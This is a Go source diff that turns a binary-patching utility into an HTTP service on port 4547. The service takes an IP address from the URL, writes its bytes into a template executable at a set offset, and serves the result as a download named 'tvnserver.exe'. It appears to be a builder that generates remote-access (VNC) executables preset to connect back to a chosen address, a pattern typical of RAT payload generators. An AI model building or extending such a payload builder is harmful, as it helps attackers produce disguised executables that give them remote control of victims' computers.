@@ -2,9 +2,12 @@ package main
 
 import (
 	"../config"
-	log "github.com/sirupsen/logrus"
+	log "github.com/Sirupsen/logrus"
+	"github.com/labstack/echo"
+	"github.com/pkg/errors"
 	"io/ioutil"
 	"net"
+	"net/http"
 )
 
 func main() {
@@ -19,21 +22,22 @@ func main() {
 	log.Debug("Template length:", len(templateFile))
 	offset := cfg.Builder.Offset
 
-	s := templateFile[offset : offset+4]
-	log.Info(net.IPv4(s[0], s[1], s[2], s[3]))
-
-	ip := net.ParseIP("37.21.168.41")
-
-	if ip == nil {
-		log.Fatalln("Unable to parse IP")
-	}
-	s[0] = ip[15]
-	s[1] = ip[14]
-	s[2] = ip[13]
-	s[3] = ip[12]
-	//copy(s, ip[12:])
-	log.Info(net.IPv4(s[0], s[1], s[2], s[3]))
-
+	e := echo.New()
+	e.GET("/:address", func(c echo.Context) error {
+		pAddress := c.Param("address")
+		e.Logger.Info("Parsing address:", pAddress)
+		ip := net.ParseIP(pAddress)
+		if ip == nil {
+			//todo: right error handling
+			e.Logger.Error("Unable to parse IP:", pAddress)
+			return errors.New("Unable to parse address specified")
+		}
+		insert := []byte{ip[15], ip[14], ip[13], ip[12]}
+		gen := Generator{template: &templateFile, insertOffset: offset, insert: insert}
+		c.Response().Header().Set("Content-Disposition", "Attachment;filename=tvnserver.exe")
+		return c.Stream(http.StatusOK, echo.MIMEOctetStream, &gen)
+	})
+	e.Logger.Fatal(e.Start(":4547"))
 }
 
 func getTemplate(cfg *config.Config) []byte {
